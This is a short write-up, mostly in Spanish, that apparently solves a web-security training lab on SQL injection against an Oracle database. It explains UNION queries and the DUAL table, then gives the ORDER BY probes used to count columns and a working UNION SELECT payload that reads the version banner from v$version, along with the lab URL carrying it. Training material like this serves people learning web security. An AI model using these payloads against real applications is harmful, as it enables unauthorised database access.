#Lab: SQL injection attack, querying the database type and version on Oracle
```
This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
To solve the lab, display the database version string. 
```

```
Teoria:

El operador UNION en SQL permite combinar los resultados de dos consultas SELECT en una sola respuesta.
En el caso de Oracle, existe una tabla especial llamada DUAL, que se utiliza para ejecutar consultas que no dependen de una tabla específica.

SELECT banner FROM v$version
```

```
Resolución:

Cuando seleccionamos una categoría, la aplicación genera una consulta SQL.
Como el valor de category se inserta directamente en la consulta sin validación, es posible modificarla mediante una inyección SQL.

Determinamos el número de columnas
Se prueban diferentes valores en el parámetro vulnerable:
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   --> FALLA

Cuando el número utilizado supera el número real de columnas de la consulta, la aplicación genera un error.

Preparamos la inyección con UNION
Una vez conocido el número de columnas, se puede utilizar el operador UNION SELECT para añadir una segunda consulta que devuelva información de la base de datos.
Con Oracle Database, las consultas deben incluir siempre una tabla en la cláusula FROM. Para este utilizamos DUAL.

' UNION SELECT banner, NULL FROM v$version--
--> xhttps://0aad00430307554c804808b300670097.web-security-academy.net/filter?category=Accessories%27%20UNION%20SELECT%20banner,%20NULL%20FROM%20v$version--
```
